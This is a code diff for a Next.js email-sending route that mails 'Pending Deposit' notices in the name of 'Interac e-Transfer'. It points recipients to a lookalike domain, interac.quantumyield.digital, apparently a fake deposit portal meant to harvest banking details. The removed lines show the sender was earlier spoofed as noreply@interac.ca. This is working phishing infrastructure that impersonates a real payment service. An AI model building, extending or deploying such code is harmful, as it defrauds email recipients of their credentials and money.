@@ -1,5 +1,5 @@
 import { type NextRequest, NextResponse } from "next/server"
-import { generateInteracEmailHtml } from "@/lib/email-template"
+import { generateEmailByTemplateId } from "@/lib/email-template-generators"
 
 export async function POST(request: NextRequest) {
   try {
@@ -10,61 +10,75 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
     }
 
-    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount
+    const resendApiKey = process.env.RESEND_API_KEY
+    if (!resendApiKey) {
+      return NextResponse.json(
+        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
+        { status: 500 },
+      )
+    }
 
+    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount
     if (isNaN(amountNumber)) {
       return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
     }
 
-    const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${recipient}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`
+    const depositBaseUrl = "https://interac.quantumyield.digital"
+    const depositParams = new URLSearchParams({
+      transferId,
+      amount: amountNumber.toString(),
+      recipient,
+      recipientName: recipientName || "",
+      bankName: bankName || "Banking System",
+      message: message || "",
+      timestamp: timestamp?.toString() || Date.now().toString(),
+    })
+    const depositLink = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`
 
-    const html = generateInteracEmailHtml({
-      amount: amountNumber,
-      senderName: "Interac e-Transfer",
+    const html = generateEmailByTemplateId("deposit-on-hold", {
       recipientName: recipientName || recipient,
-      securityQuestion: "Pending Deposit Notification",
-      securityAnswer: "Click the button below to view details",
+      amount: amountNumber,
       message: message || `Transaction ID: ${transferId}`,
-      depositLink: depositUrl,
-      transferId: transferId,
-      institution: bankName || "Banking System",
+      depositLink,
+      transferId,
+      senderName: "Interac e-Transfer",
+      bankName: bankName || "Banking System",
     })
 
-    const response = await fetch("https://api.sendgrid.com/v3/mail/send", {
+    if (!html) {
+      return NextResponse.json({ error: "Failed to generate email template" }, { status: 500 })
+    }
+
+    const fromAddress = process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>"
+    console.log("[v0] send-pending-deposit — from:", fromAddress, "to:", recipient)
+
+    const response = await fetch("https://api.resend.com/emails", {
       method: "POST",
       headers: {
+        Authorization: `Bearer ${resendApiKey}`,
         "Content-Type": "application/json",
-        Authorization: `Bearer ${process.env.SENDGRID_API_KEY}`,
       },
       body: JSON.stringify({
-        personalizations: [
-          {
-            to: [{ email: recipient, name: recipientName || recipient }],
-          },
-        ],
-        from: {
-          email: process.env.SENDGRID_FROM_EMAIL || "noreply@interac.ca",
-          name: "Interac e-Transfer",
-        },
-        subject: `Pending Deposit - ${transferId}`,
-        content: [
-          {
-            type: "text/html",
-            value: html,
-          },
-        ],
+        from: fromAddress,
+        to: [recipient],
+        subject: `Pending Deposit Notification — ${transferId}`,
+        html,
       }),
     })
 
+    const resendData = await response.json()
+    console.log("[v0] send-pending-deposit Resend response:", response.status, JSON.stringify(resendData))
+
     if (!response.ok) {
-      const errorText = await response.text()
-      console.error("SendGrid error:", errorText)
-      return NextResponse.json({ error: "Failed to send email", details: errorText }, { status: 500 })
+      return NextResponse.json(
+        { error: `Resend error (${response.status}): ${resendData?.message || JSON.stringify(resendData)}` },
+        { status: 500 }
+      )
     }
 
-    return NextResponse.json({ success: true, message: "Pending deposit email sent successfully" })
+    return NextResponse.json({ success: true, emailId: resendData?.id, message: "Pending deposit email sent successfully" })
   } catch (error) {
-    console.error("Error sending pending deposit email:", error)
+    console.error("[v0] Error sending pending deposit email:", error)
     return NextResponse.json({ error: "Internal server error" }, { status: 500 })
   }
 }
